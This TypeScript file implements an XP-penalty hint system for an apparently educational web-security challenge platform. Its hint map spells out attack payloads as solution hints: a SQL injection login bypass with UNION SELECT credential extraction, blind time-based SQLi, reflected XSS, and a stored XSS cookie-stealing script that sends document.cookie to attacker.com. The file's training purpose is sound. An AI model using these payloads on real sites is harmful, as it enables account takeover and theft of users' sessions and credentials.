/**
 * Hint system with XP penalty.
 * Progressive hints that reduce max XP for a challenge.
 */

export type HintLevel = 1 | 2 | 3;

export interface Hint {
  level: HintLevel;
  text: string;
  xpReduction: number; // percentage of XP reduced
}

/**
 * XP reduction per hint level:
 * Level 1: 10% reduction
 * Level 2: 25% reduction
 * Level 3: 50% reduction
 */
export const HINT_XP_PENALTY: Record<HintLevel, number> = {
  1: 0.10,
  2: 0.25,
  3: 0.50,
};

/**
 * Calculate the effective XP for a challenge after hint usage.
 * @param baseXP - Base XP for the challenge
 * @param usedHints - Array of hint levels used
 * @returns Effective XP (rounded down)
 */
export function calculateHintedXP(baseXP: number, usedHints: HintLevel[]): number {
  if (usedHints.length === 0) return baseXP;

  // Take the highest penalty (most severe)
  const maxPenalty = Math.max(...usedHints.map((level) => HINT_XP_PENALTY[level]));
  const reduction = Math.round(baseXP * maxPenalty);
  return Math.max(0, baseXP - reduction);
}

/**
 * Generate hints for a specific challenge/task.
 * @param taskKey - Unique identifier for the task
 * @returns Array of hints from general to specific
 */
export function getHints(taskKey: string): Hint[] {
  const hintMap = getHintMap();
  return hintMap[taskKey] || getDefaultHints(taskKey);
}

/**
 * Get the hint level description for display.
 */
export function getHintLevelLabel(level: HintLevel): string {
  switch (level) {
    case 1: return 'General hint';
    case 2: return 'Specific hint';
    case 3: return 'Solution hint';
  }
}

/**
 * Default hints for any task.
 */
function getDefaultHints(taskKey: string): Hint[] {
  return [
    {
      level: 1,
      text: `Think about what vulnerability this task is testing. Review the relevant module materials.`,
      xpReduction: HINT_XP_PENALTY[1],
    },
    {
      level: 2,
      text: `Look at the code carefully. Pay attention to input validation, output encoding, and authentication checks.`,
      xpReduction: HINT_XP_PENALTY[2],
    },
    {
      level: 3,
      text: `The answer involves understanding how the data flows through the application. Trace the input from entry point to output.`,
      xpReduction: HINT_XP_PENALTY[3],
    },
  ];
}

/**
 * Specific hints for known tasks.
 */
function getHintMap(): Record<string, Hint[]> {
  return {
    // OWASP challenges
    'owasp-1': [
      { level: 1, text: 'This is about injection attacks. What kind of data does the application accept from users?', xpReduction: 0.10 },
      { level: 2, text: 'Check if the application uses prepared statements or concatenates user input directly into queries.', xpReduction: 0.25 },
      { level: 3, text: 'The vulnerability allows an attacker to execute arbitrary SQL commands by manipulating the search field input.', xpReduction: 0.50 },
    ],
    'owasp-2': [
      { level: 1, text: 'This challenge focuses on broken authentication. How does the application verify user identity?', xpReduction: 0.10 },
      { level: 2, text: 'Look at the session management and password recovery mechanisms.', xpReduction: 0.25 },
      { level: 3, text: 'The application exposes session tokens in URLs and allows unlimited login attempts without rate limiting.', xpReduction: 0.50 },
    ],

    // SQL Injection levels
    'sql-basic': [
      { level: 1, text: 'Try to break out of the SQL string using a single quote character (\').', xpReduction: 0.10 },
      { level: 2, text: 'Use a UNION SELECT statement to retrieve data from other tables.', xpReduction: 0.25 },
      { level: 3, text: 'Inject: \' OR 1=1 -- to bypass authentication, then use UNION SELECT to extract user credentials from the users table.', xpReduction: 0.50 },
    ],

    'sql-advanced': [
      { level: 1, text: 'This is a blind SQL injection. The application does not show database errors directly.', xpReduction: 0.10 },
      { level: 2, text: 'Use boolean-based or time-based techniques to infer information about the database structure.', xpReduction: 0.25 },
      { level: 3, text: 'Apply the SUBSTRING and SLEEP functions to extract data character by character using time delays.', xpReduction: 0.50 },
    ],

    // XSS challenges
    'xss-reflected': [
      { level: 1, text: 'The input is reflected directly in the page without proper escaping.', xpReduction: 0.10 },
      { level: 2, text: 'Try injecting a script tag with an alert function to confirm the vulnerability.', xpReduction: 0.25 },
      { level: 3, text: 'Submit: &lt;script&gt;alert(\'XSS\')&lt;/script&gt; in the search field.', xpReduction: 0.50 },
    ],
    'xss-stored': [
      { level: 1, text: 'The input is saved to the database and displayed to all users who view the page.', xpReduction: 0.10 },
      { level: 2, text: 'Use the comment form to inject a persistent script that executes whenever the page loads.', xpReduction: 0.25 },
      { level: 3, text: 'Post a comment containing: &lt;script&gt;document.location=\'http://attacker.com/?cookie=\'+document.cookie&lt;/script&gt;', xpReduction: 0.50 },
    ],

    // Secure Coding challenges
    'secure-1': [
      { level: 1, text: 'Look for hardcoded credentials in the source code.', xpReduction: 0.10 },
      { level: 2, text: 'Check configuration files and environment variables for embedded secrets.', xpReduction: 0.25 },
      { level: 3, text: 'The developer left database credentials in the config.php file with world-readable permissions.', xpReduction: 0.50 },
    ],
    'secure-2': [
      { level: 1, text: 'This is about insecure deserialization. Find where user-supplied data is deserialized.', xpReduction: 0.10 },
      { level: 2, text: 'The application uses PHP unserialize() on data from cookies without validation.', xpReduction: 0.25 },
      { level: 3, text: 'Modify the serialized session cookie to include a malicious object that executes system commands.', xpReduction: 0.50 },
    ],
  };
}
